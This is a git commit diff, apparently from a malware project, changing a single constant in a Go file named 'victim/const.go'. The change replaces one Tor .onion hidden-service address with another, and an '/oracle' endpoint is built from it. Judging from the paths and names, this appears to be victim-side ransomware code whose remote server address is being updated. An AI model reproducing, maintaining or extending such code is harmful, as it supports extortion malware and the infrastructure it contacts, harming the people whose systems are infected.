e9027723f47edbf182dca8d06da0531955708dc7
sugoiuguu <sugoiuguu@tfwno.gf>
2020-05-10 05:58:11 +0100

    update hs

--- go/crypto/scheme/victim/const.go
+++ go/crypto/scheme/victim/const.go
@@ -21,7 +21,7 @@ var (
 )
 
 const (
-    hiddenServiceBase   = "http://r3mak6rfiz5i3tseipltpdod3md5uujj5risdqyck5f2lwlsn2mbqvad.onion"
+    hiddenServiceBase   = "http://w3unwrwgweysy3tzxjtuwnef5kaq637i2v5tn6pyshd5w73ncif537ad.onion"
     hiddenServiceOracle = hiddenServiceBase + "/oracle"
 )
 
